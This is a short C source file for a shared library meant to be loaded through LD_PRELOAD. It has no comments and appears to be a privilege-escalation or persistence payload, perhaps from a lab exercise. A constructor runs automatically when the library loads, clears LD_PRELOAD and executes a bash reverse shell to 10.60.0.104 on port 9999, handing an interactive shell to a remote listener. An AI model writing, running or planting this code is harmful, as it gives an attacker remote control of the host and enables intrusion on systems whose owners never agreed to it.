#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void payload() {
	unsetenv("LD_PRELOAD");
    system("bash -c 'bash -i >& /dev/tcp/10.60.0.104/9999 0>&1'");
}

__attribute__((constructor))
void init() {
    if (getenv("LD_PRELOAD") != NULL) {
        payload();
    }
}